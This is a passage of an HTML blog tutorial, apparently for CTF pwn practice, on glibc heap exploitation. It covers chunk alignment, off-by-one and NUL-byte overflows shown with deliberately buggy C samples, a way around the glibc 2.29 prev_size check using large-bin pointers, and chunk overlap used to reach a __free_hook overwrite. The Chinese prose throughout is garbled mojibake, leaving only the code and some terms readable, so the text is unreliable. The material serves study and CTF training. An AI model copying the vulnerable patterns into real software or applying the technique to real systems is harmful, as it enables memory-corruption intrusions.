<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åœ¨ä¸Šè¿°ä»£ç ä¸­ï¼Œç”³è¯·çš„ <code>chunk</code> å¤§å°æ˜¯ 24 å­—èŠ‚</p><p>ä½†æ˜¯å°†å…¶ç¼–è¯‘ä¸º 64 ä½å¯æ‰§è¡Œç¨‹åºæ—¶ï¼Œå®é™…ä¸Šåˆ†é…çš„å†…å­˜ä¼šæ˜¯ 16 å­—èŠ‚è€Œä¸æ˜¯ 24 å­—èŠ‚</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">//æ ¹æ®ç³»ç»Ÿçš„ä½æ•°ï¼Œmalloc ä¼šåˆ†é… 8 æˆ– 16 å­—èŠ‚çš„ç”¨æˆ·ç©ºé—´</span>
<span class="token number">0x602000</span><span class="token operator">:</span>   <span class="token number">0x0000000000000000</span>  <span class="token number">0x0000000000000021</span>
<span class="token number">0x602010</span><span class="token operator">:</span>   <span class="token number">0x0000000000000000</span>  <span class="token number">0x0000000000000000</span>
<span class="token number">0x602020</span><span class="token operator">:</span>   <span class="token number">0x0000000000000000</span>  <span class="token number">0x0000000000020fe1</span>
<span class="token number">0x602030</span><span class="token operator">:</span>   <span class="token number">0x0000000000000000</span>  <span class="token number">0x0000000000000000</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>16 å­—èŠ‚çš„ç©ºé—´æ˜¯å¦‚ä½•è£…å¾—ä¸‹ 24 ä¸ªå­—èŠ‚çš„å†…å®¹å‘¢ï¼Ÿç­”æ¡ˆæ˜¯å€Ÿç”¨äº†ä¸‹ä¸€ä¸ªå—çš„ <code>pre_size</code> åŸŸ</p><p>ç”¨æˆ·ç”³è¯·çš„å†…å­˜å¤§å°ä¸ Glibc ä¸­å®é™…åˆ†é…çš„å†…å­˜å¤§å°ä¹‹é—´çš„è½¬æ¢å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">/* pad request bytes into a usable size -- internal version */</span>
<span class="token comment">// MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">request2size</span><span class="token expression"><span class="token punctuation">(</span>req<span class="token punctuation">)</span>                                                      </span><span class="token punctuation">\</span>
    <span class="token expression"><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>req<span class="token punctuation">)</span> <span class="token operator">+</span> SIZE_SZ <span class="token operator">+</span> MALLOC_ALIGN_MASK <span class="token operator">&lt;</span> MINSIZE<span class="token punctuation">)</span>                           </span><span class="token punctuation">\</span>
         <span class="token expression"><span class="token operator">?</span> MINSIZE                                                             </span><span class="token punctuation">\</span>
         <span class="token expression"><span class="token operator">:</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>req<span class="token punctuation">)</span> <span class="token operator">+</span> SIZE_SZ <span class="token operator">+</span> MALLOC_ALIGN_MASK<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token operator">~</span>MALLOC_ALIGN_MASK<span class="token punctuation">)</span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å½“ <code>req = 24</code> æ—¶ï¼Œ<code>request2size(24) = 32</code></p><p>é™¤å» <code>chunk</code> å¤´éƒ¨çš„ 16 å­—èŠ‚ï¼Œå®é™…ä¸Šç”¨æˆ·å¯ç”¨ <code>chunk</code> ä¸º 16 å­—èŠ‚ï¼Œè€Œ <code>chunk</code> çš„ <code>pre_size</code> ä»…å½“å®ƒçš„å‰ä¸€å—å¤„äºé‡Šæ”¾çŠ¶æ€æ—¶æ‰èµ·ä½œç”¨ï¼Œæ‰€ä»¥ç”¨æˆ·è¿™æ—¶å€™å…¶å®è¿˜å¯ä»¥ä½¿ç”¨ä¸‹ä¸€ä¸ª <code>chunk</code> çš„ <code>prev_size</code> å­—æ®µï¼Œæ­£å¥½ 24 ä¸ªå­—èŠ‚</p><blockquote><p>å®é™…ä¸Š <code>ptmalloc2</code> åˆ†é…å†…å­˜æ˜¯ä»¥åŒå­—ä¸ºåŸºæœ¬å•ä½</p><p>ä»¥ 64 ä½ç³»ç»Ÿä¸ºä¾‹ï¼Œåˆ†é…å‡ºæ¥çš„ç©ºé—´æ˜¯ 16 çš„æ•´æ•°å€ï¼Œå³ç”¨æˆ·ç”³è¯·çš„ <code>chunk</code> éƒ½æ˜¯ 16 å­—èŠ‚å¯¹é½çš„</p></blockquote><hr><h1 id="Off-By-One"><a href="#Off-By-One" class="headerlink" title="Off-By-One"></a>Off-By-One</h1><blockquote><p>off-by-one æŒ‡ç¨‹åºå‘ç¼“å†²åŒºä¸­å†™å…¥æ—¶ï¼Œå†™å…¥çš„å­—èŠ‚æ•°è¶…è¿‡äº†è¿™ä¸ªç¼“å†²åŒºæœ¬èº«æ‰€ç”³è¯·çš„å­—èŠ‚æ•°ï¼Œå¹¶ä¸”<strong>åªè¶Šç•Œäº†ä¸€ä¸ªå­—èŠ‚</strong>ï¼Œå±äºä¸€ç§ç‰¹æ®Šçš„æº¢å‡ºæ¼æ´</p><p>å‚è€ƒæ–‡ç« ï¼š<a target="_blank" rel="external nofollow noopener noreferrer" href="/go.html?target=aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9oZWFwL3B0bWFsbG9jMi9vZmYtYnktb25lLw==">å †ä¸­çš„ off-by-one - CTF Wiki</a></p></blockquote><p>off-by-one æœ€ç»ˆçš„æ•ˆæœæ˜¯å¯ä»¥å°†ä¸€ä¸ªé‡Šæ”¾çŠ¶æ€çš„ <code>small bin chunk</code> æˆ–æ˜¯ <code>unsorted bin chunk</code> ä¸€ç›´åˆ°è¢«æº¢å‡º <code>chunk</code> åˆå¹¶æˆä¸€ä¸ªå¤§çš„ <code>chunk</code></p><hr><h2 id="äº§ç”ŸåŸå› "><a href="#äº§ç”ŸåŸå› " class="headerlink" title="äº§ç”ŸåŸå› "></a>äº§ç”ŸåŸå› </h2><p>è¿™ç§æ¼æ´çš„äº§ç”Ÿå¾€å¾€ä¸è¾¹ç•ŒéªŒè¯ä¸ä¸¥å’Œå­—ç¬¦ä¸²æ“ä½œæœ‰å…³ï¼Œä¾‹å¦‚ï¼š</p><ul><li>ä½¿ç”¨å¾ªç¯è¯­å¥å‘å †å—ä¸­å†™å…¥æ•°æ®æ—¶ï¼Œå¾ªç¯çš„æ¬¡æ•°è®¾ç½®é”™è¯¯ï¼ˆè¿™åœ¨ C è¯­è¨€åˆå­¦è€…ä¸­å¾ˆå¸¸è§ï¼‰å¯¼è‡´å¤šå†™å…¥äº†ä¸€ä¸ªå­—èŠ‚</li></ul><p>ç¤ºä¾‹ï¼š</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">my_gets</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>ptr<span class="token punctuation">,</span><span class="token keyword">int</span> size<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">int</span> i<span class="token punctuation">;</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> size<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        ptr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> i<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">void</span> <span class="token operator">*</span>chunk1<span class="token punctuation">,</span> <span class="token operator">*</span>chunk2<span class="token punctuation">;</span>
    chunk1 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    chunk2 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Get Input:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">my_gets</span><span class="token punctuation">(</span>chunk1<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç”±äº for å¾ªç¯çš„è¾¹ç•Œæ²¡æœ‰æ§åˆ¶å¥½ï¼Œå¯¼è‡´å†™å…¥å¤šæ‰§è¡Œäº†ä¸€æ¬¡</p><p>æ‰§è¡Œ <code>my_gets()</code> ä¹‹å‰çš„å †ï¼š</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A81.png" alt="CTF - PWN_å †ç›¸å…³çš„æ¼æ´ä¸åˆ©ç”¨1.png"></p><p>å‡è®¾è¾“å…¥äº† 17 ä¸ªå­—èŠ‚ï¼š<code>aaaaaaaaaaaaaaaaa</code>ï¼Œæ­¤æ—¶çš„å †ï¼š</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A82.png" alt="CTF - PWN_å †ç›¸å…³çš„æ¼æ´ä¸åˆ©ç”¨2.png"></p><p>å¯ä»¥çœ‹åˆ°æ•°æ®å‘ç”Ÿäº†æº¢å‡ºï¼Œæœ‰ä¸€ä¸ª <code>'a'</code> è¦†ç›–åˆ°äº†ä¸‹ä¸€ä¸ªå †å—çš„ <code>prev_size</code> åŸŸ</p><ul><li>å­—ç¬¦ä¸²æ“ä½œä¸åˆé€‚</li></ul><p>ç¤ºä¾‹ï¼š</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">char</span> buffer<span class="token punctuation">[</span><span class="token number">40</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>
    <span class="token keyword">void</span> <span class="token operator">*</span>chunk1<span class="token punctuation">;</span>
    chunk1 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Get Input"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">gets</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>
    
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">24</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token function">strcpy</span><span class="token punctuation">(</span>chunk1<span class="token punctuation">,</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¦‚æœä¸è€ƒè™‘æ ˆæº¢å‡ºï¼Œä¼¼ä¹æ²¡ä»€ä¹ˆé—®é¢˜ï¼Œå¯èƒ½å¾ˆå¤šäººåœ¨å®é™…çš„ä»£ç ä¸­ä¹Ÿæ˜¯è¿™æ ·å†™çš„ï¼Œä½†æ˜¯ <strong><code>strlen</code> å’Œ <code>strcpy</code> çš„è¡Œä¸ºä¸ä¸€è‡´å´å¯¼è‡´äº† off-by-one çš„å‘ç”Ÿ</strong></p><p>åŸå› åœ¨äºï¼Œ<code>strlen</code> åœ¨è®¡ç®—å­—ç¬¦ä¸²é•¿åº¦æ—¶ä¸åŒ…æ‹¬ç»“æŸç¬¦&nbsp;<code>'\x00'</code>ï¼Œè€Œ <code>strcpy</code> åœ¨å¤åˆ¶å­—ç¬¦ä¸²æ—¶ä¼šæ‹·è´ç»“æŸç¬¦&nbsp;<code>'\x00'</code>ï¼Œå› æ­¤ï¼Œæœ€åå…¶å®å‘ <code>chunk1</code> ä¸­å†™å…¥äº† 25 ä¸ªå­—èŠ‚</p><p>æ‰§è¡Œ <code>gets(buffer)</code> ä¹‹å‰çš„å †ï¼š</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A83.png" alt="CTF - PWN_å †ç›¸å…³çš„æ¼æ´ä¸åˆ©ç”¨3.png"></p><p>æ‰§è¡Œ <code>strcpy(chunk1, buffer)</code> ä¹‹åï¼š</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A84.png" alt="CTF - PWN_å †ç›¸å…³çš„æ¼æ´ä¸åˆ©ç”¨4.png"></p><p>å¯ä»¥çœ‹åˆ° <code>next chunk</code> çš„ <code>size</code> åŸŸä½å­—èŠ‚è¢«ç»“æŸç¬¦&nbsp;<code>'\x00'</code>&nbsp;è¦†ç›–ï¼ˆè¿™ç§æƒ…å†µåˆå±äº off-by-one çš„ä¸€ä¸ªåˆ†æ”¯ï¼šNULL byte off-by-oneï¼‰</p><ul><li>å½“ç„¶ï¼Œä¹Ÿä¸æ’é™¤å†™å…¥çš„ <code>size</code> æ­£å¥½å°±åªå¤šäº†ä¸€ä¸ªå­—èŠ‚çš„æƒ…å†µ</li></ul><blockquote><p>ä¸€èˆ¬æ¥è¯´ï¼Œå•å­—èŠ‚æº¢å‡ºè¢«è®¤ä¸ºæ˜¯éš¾ä»¥åˆ©ç”¨çš„</p><p>ä½†æ˜¯å› ä¸º Linux çš„å †ç®¡ç†æœºåˆ¶ <code>ptmalloc2</code> éªŒè¯çš„æ¾æ•£æ€§ï¼ŒåŸºäº Linux å †çš„ off-by-one æ¼æ´åˆ©ç”¨èµ·æ¥å¹¶ä¸å¤æ‚ï¼Œå¹¶ä¸”å¨åŠ›å¼ºå¤§</p></blockquote><hr><h2 id="åˆ©ç”¨æ€è·¯"><a href="#åˆ©ç”¨æ€è·¯" class="headerlink" title="åˆ©ç”¨æ€è·¯"></a>åˆ©ç”¨æ€è·¯</h2><ol><li>æº¢å‡ºå­—èŠ‚ä¸ºå¯æ§åˆ¶ä»»æ„å­—èŠ‚</li></ol><p>é€šè¿‡ä¿®æ”¹å¤§å°é€ æˆå—ç»“æ„ä¹‹é—´å‡ºç°é‡å ï¼Œä»è€Œæ³„éœ²æˆ–è€…è¦†ç›–å…¶ä»–å—æ•°æ®</p><ol start="2"><li>æº¢å‡ºå­—èŠ‚ä¸º NULL å­—èŠ‚</li></ol><p>åœ¨ <code>size</code> ä¸º 0x100 çš„æ—¶å€™ï¼Œæº¢å‡º NULL å­—èŠ‚å¯ä»¥ä½¿å¾—&nbsp;<code>prev_in_use</code>&nbsp;ä½è¢«æ¸…é™¤ï¼ˆè®°å½•å‰ä¸€ä¸ª <code>chunk</code> å—æ˜¯å¦è¢«åˆ†é…ï¼‰ï¼Œè¿™æ ·å‰ä¸€ä¸ªå—ä¼šè¢«è®¤ä¸ºæ˜¯ free å—</p><p>ç„¶åå¯ä»¥é‡‡ç”¨ä»¥ä¸‹æ–¹æ³•ï¼š</p><p>ï¼ˆ1ï¼‰ä½¿ç”¨ unlink æ–¹æ³•è¿›è¡Œå¤„ç†</p><p>ï¼ˆ2ï¼‰ç”±äºè¿™æ—¶&nbsp;<code>prev_size</code>&nbsp;åŸŸä¼šè¢«å¯ç”¨ï¼Œå¯ä»¥ä¼ªé€ &nbsp;<code>prev_size</code> é€ æˆå—ä¹‹é—´å‘ç”Ÿé‡å ã€‚æ­¤æ–¹æ³•çš„å…³é”®åœ¨äº unlink çš„æ—¶å€™æ²¡æœ‰æ£€æŸ¥æŒ‰ç…§&nbsp;<code>prev_size</code>&nbsp;æ‰¾åˆ°çš„å—çš„å¤§å°ä¸ <code>prev_size</code>&nbsp;æ˜¯å¦ä¸€è‡´</p><blockquote><p>æ³¨æ„ï¼š</p><p>åœ¨ Glibc 2.29 ä»¥åçš„ç‰ˆæœ¬ä»£ç ä¸­å·²ç»åŠ å…¥é’ˆå¯¹æ–¹æ³•ï¼ˆ2ï¼‰çš„ <code>check</code> ï¼Œå› æ­¤ä¼ ç»Ÿçš„æ–¹æ³•ï¼ˆ2ï¼‰å¤±æ•ˆï¼›ä½†æ˜¯åœ¨ Glibc 2.28 åŠä¹‹å‰ç‰ˆæœ¬å¹¶æ²¡æœ‰è¯¥ <code>check</code>ï¼Œå¯ä»¥ç»§ç»­ä½¿ç”¨</p></blockquote><p>Glibc ä¸­å¯¹äºæ­¤å¤„çš„ <code>check</code> å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">/* consolidate backward */</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">prev_inuse</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      prevsize <span class="token operator">=</span> <span class="token function">prev_size</span> <span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>
      size <span class="token operator">+=</span> prevsize<span class="token punctuation">;</span>
      p <span class="token operator">=</span> <span class="token function">chunk_at_offset</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span> prevsize<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token comment">/* ä¸‹é¢ä¸¤è¡Œä»£ç åœ¨æ–°ç‰ˆæœ¬ Glibc ä¸­åŠ å…¥ï¼Œåˆ™æ–¹æ³•ï¼ˆ2ï¼‰æ— æ³•ä½¿ç”¨ï¼Œä½†æ˜¯ Glibc 2.28 åŠä¹‹å‰ç‰ˆæœ¬éƒ½æ²¡æœ‰é—®é¢˜
      if (__glibc_unlikely (chunksize(p) != prevsize))
        malloc_printerr ("corrupted size vs. prev_size while consolidating"); */</span>
      <span class="token function">unlink_chunk</span> <span class="token punctuation">(</span>av<span class="token punctuation">,</span> p<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Glibc 2.29 ä»¥åçš„ç‰ˆæœ¬ä¸­ï¼Œ <code>check</code> å¤„å¢åŠ äº†ä¸¤è¡Œä»£ç ï¼š</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__glibc_unlikely</span> <span class="token punctuation">(</span><span class="token function">chunksize</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span> <span class="token operator">!=</span> prevsize<span class="token punctuation">)</span><span class="token punctuation">)</span>
  <span class="token function">malloc_printerr</span> <span class="token punctuation">(</span><span class="token string">"corrupted size vs. prev_size while consolidating"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>è¿™è®©æˆ‘ä»¬æƒ³è¦æ§åˆ¶ä¸€ä¸ªçœŸå® <code>chunk</code> çš„ <code>size</code> å­—æ®µå˜å¾—æ›´åŠ å›°éš¾ï¼Œæ‰€ä»¥ä¼ ç»Ÿçš„ NULL byte off-by-one æ–¹æ³•å¤±æ•ˆ</p><p>ä½†æ˜¯ï¼Œåªéœ€è¦æ»¡è¶³è¢« unlink çš„ <code>chunk</code> å’Œä¸‹ä¸€ä¸ª <code>chunk</code> ç›¸è¿ï¼Œä»ç„¶å¯ä»¥ä¼ªé€  <code>fake_chunk</code></p><p>ä¼ªé€ çš„æ–¹å¼å°±æ˜¯ä½¿ç”¨ <code>large bin</code> é—ç•™çš„ <code>fd_nextsize</code> å’Œ <code>bk_nextsize</code> æŒ‡é’ˆï¼š</p><ul><li>ä»¥ <code>fd_nextsize</code> ä¸º <code>fake_chunk</code> çš„ <code>fd</code></li><li>ä»¥ <code>bk_nextsize</code> ä¸º <code>fake_chunk</code> çš„ <code>bk</code></li></ul><p>è¿™æ ·æˆ‘ä»¬å¯ä»¥å®Œå…¨æ§åˆ¶è¯¥ <code>fake_chunk</code> çš„ <code>size</code> å­—æ®µï¼ˆè¿™ä¸ªè¿‡ç¨‹ä¼šç ´ååŸ <code>large bin chunk</code> çš„ <code>fd</code> æŒ‡é’ˆï¼Œä½†æ˜¯æ²¡æœ‰å…³ç³»ï¼‰ï¼ŒåŒæ—¶è¿˜å¯ä»¥é€šè¿‡éƒ¨åˆ†è¦†å†™ <code>fd_nextsize</code> æ§åˆ¶å…¶ <code>fd</code>ï¼Œç„¶ååœ¨åé¢ä½¿ç”¨å…¶ä»–çš„ <code>chunk</code> è¾…åŠ©ä¼ªé€ ï¼Œå¯ä»¥é€šè¿‡è¯¥ <code>check</code></p><p>ç„¶ååªéœ€è¦é€šè¿‡ unlink çš„æ£€æµ‹å°±å¯ä»¥äº†ï¼Œä¹Ÿå°±æ˜¯ï¼š</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token punctuation">(</span>fd <span class="token operator">-&gt;</span> bk <span class="token operator">==</span> p<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>bk <span class="token operator">-&gt;</span> fd <span class="token operator">==</span> p<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>å¦‚æœ <code>large bin</code> ä¸­ä»…æœ‰ä¸€ä¸ª <code>chunk</code>ï¼Œé‚£ä¹ˆè¯¥ <code>chunk</code> çš„ <code>fd_nextsize</code> æŒ‡é’ˆå’Œ <code>bk_nextsize</code> æŒ‡é’ˆéƒ½ä¼šæŒ‡å‘è‡ªå·±</p></blockquote><ol><li><p>æˆ‘ä»¬å¯ä»¥æ§åˆ¶ <code>fd_nextsize</code> æŒ‡å‘å †ä¸Šçš„ä»»æ„åœ°å€ï¼Œå¯ä»¥å®¹æ˜“åœ°ä½¿ä¹‹æŒ‡å‘ä¸€ä¸ª <code>fast bin + 0x10 - 0x18</code>ï¼Œè€Œ <code>fast bin</code> ä¸­çš„ <code>fd</code> ä¹Ÿä¼šæŒ‡å‘å †ä¸Šçš„ä¸€ä¸ªåœ°å€ï¼Œé€šè¿‡éƒ¨åˆ†è¦†å†™è¯¥æŒ‡é’ˆä¹Ÿå¯ä»¥ä½¿è¯¥æŒ‡é’ˆæŒ‡å‘ä¹‹å‰çš„ <code>large bin + 0x10</code>ï¼Œè¿™æ ·å°±å¯ä»¥é€šè¿‡&nbsp;<code>fd -&gt; bk == p</code>&nbsp;çš„æ£€æµ‹</p></li><li><p>ç”±äº <code>bk_nextsize</code> æˆ‘ä»¬æ— æ³•ä¿®æ”¹ï¼Œæ‰€ä»¥ <code>bk -&gt; fd</code> å¿…ç„¶åœ¨åŸå…ˆçš„ <code>large bin chunk</code> çš„ <code>fd</code> æŒ‡é’ˆå¤„ï¼ˆè¿™ä¸ª <code>fd</code> è¢«æˆ‘ä»¬ç ´åäº†ï¼‰ï¼Œé€šè¿‡ <code>fast bin</code> çš„é“¾è¡¨ç‰¹æ€§å¯ä»¥åšåˆ°ä¿®æ”¹è¿™ä¸ªæŒ‡é’ˆä¸”ä¸å½±å“å…¶ä»–çš„æ•°æ®ï¼Œå†å°†å…¶éƒ¨åˆ†è¦†å†™å°±å¯ä»¥é€šè¿‡&nbsp;<code>bk -&gt; fd == p</code>&nbsp;çš„æ£€æµ‹</p></li><li><p>ç„¶åé€šè¿‡ off-by-one å‘ä½åœ°å€åˆå¹¶ï¼Œå®ç° <code>chunk Overlap</code>ï¼Œä¹‹åå¯ä»¥æ³„éœ² libc çš„åŸºåœ°å€å’Œå †åœ°å€ï¼Œç„¶å <code>tcache</code> æ‰“ <code>__free_hook</code> å³å¯</p></li></ol><hr><h2 id="ç›¸å…³ä¾‹é¢˜"><a href="#ç›¸å…³ä¾‹é¢˜" class="headerlink" title="ç›¸å…³ä¾‹é¢˜"></a>ç›¸å…³ä¾‹é¢˜</h2><p>è§æœ¬ç«™ ã€Š<a href="18c02ebd.html">ã€Asis CTF 2016ã€‘b00ks</a>ã€‹ã€ã€Š<a href="14f0dc5a.html">ã€plaidctf 2015ã€‘PlaidDB</a>ã€‹</p><hr><h1 id="Chunk-Extend-and-Overlap"><a href="#Chunk-Extend-and-Overlap" class="headerlink" title="Chunk Extend and Overlap"></a>Chunk Extend and Overlap</h1><blockquote><p><code>chunk extend</code>ï¼ˆå †æ‰©å±•ï¼‰æ˜¯å †æ¼æ´çš„ä¸€ç§å¸¸è§åˆ©ç”¨æ‰‹æ³•ï¼Œé€šè¿‡ <code>extend</code> å¯ä»¥å®ç° <code>chunk Overlap</code>ï¼ˆå †é‡å ï¼‰çš„æ•ˆæœ</p><p>å‚è€ƒæ–‡ç« ï¼š<a target="_blank" rel="external nofollow noopener noreferrer" href="/go.html?target=aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9oZWFwL3B0bWFsbG9jMi9jaHVuay1leHRlbmQtb3ZlcmxhcHBpbmcv">Chunk Extend and Overlapping - CTF Wiki</a></p></blockquote><p>è¿™ç§åˆ©ç”¨æ–¹æ³•é€šå¸¸éœ€è¦ä»¥ä¸‹æ¡ä»¶ï¼š</p><ul><li>ç¨‹åºä¸­å­˜åœ¨åŸºäºå †çš„æ¼æ´</li><li>æ¼æ´å¯ä»¥æ§åˆ¶ <code>chunk header</code> ä¸­çš„æ•°æ®</li></ul><p>ä¸€èˆ¬æ¥è¯´ï¼Œ<code>Chunk Extend and Overlap</code> å¹¶ä¸èƒ½ç›´æ¥æ§åˆ¶ç¨‹åºçš„æ‰§è¡Œæµç¨‹ï¼Œä½†æ˜¯å¯ä»¥æ§åˆ¶ <code>chunk</code> ä¸­çš„å†…å®¹ï¼š</p><ul><li><p>å¦‚æœ <code>chunk</code> å­˜åœ¨å­—ç¬¦ä¸²æŒ‡é’ˆã€å‡½æ•°æŒ‡é’ˆç­‰ï¼Œå°±å¯ä»¥åˆ©ç”¨è¿™äº›æŒ‡é’ˆæ¥è¿›è¡Œä¿¡æ¯æ³„æ¼å’Œæ§åˆ¶æ‰§è¡Œæµç¨‹</p></li><li><p>æ­¤å¤–ï¼Œ<code>chunk extend</code> é€šè¿‡æ§åˆ¶ <code>size</code> å’Œ <code>pre_size</code> åŸŸå¯ä»¥å®ç° <code>chunk Overlap</code>ï¼Œé€šè¿‡ <code>Overlap</code> å¯ä»¥æ§åˆ¶ <code>chunk</code> çš„ <code>fd / bk</code> æŒ‡é’ˆä»è€Œå¯ä»¥å®ç° <code>fastbin attack</code> ç­‰åˆ©ç”¨</p></li></ul><hr><h2 id="å¯¹-inuse-çš„-fast-bin-è¿›è¡Œ-extend"><a href="#å¯¹-inuse-çš„-fast-bin-è¿›è¡Œ-extend" class="headerlink" title="å¯¹ inuse çš„ fast bin è¿›è¡Œ extend"></a>å¯¹ inuse çš„ fast bin è¿›è¡Œ extend</h2><blockquote><p>å½“æˆ‘ä»¬åˆ›å»ºä¸¤ä¸ªå †å— <code>chunk1</code> å’Œ <code>chunk2</code> æ—¶ï¼Œé€šè¿‡ä¿®æ”¹ <code>chunk1</code> çš„ <code>size</code> åŸŸï¼Œä½¿å…¶ <code>size</code> çš„å¤§å°åŒ…å« <code>chunk2</code>ï¼Œé‚£ä¹ˆ <code>free</code> æ‰ <code>chunk1</code> 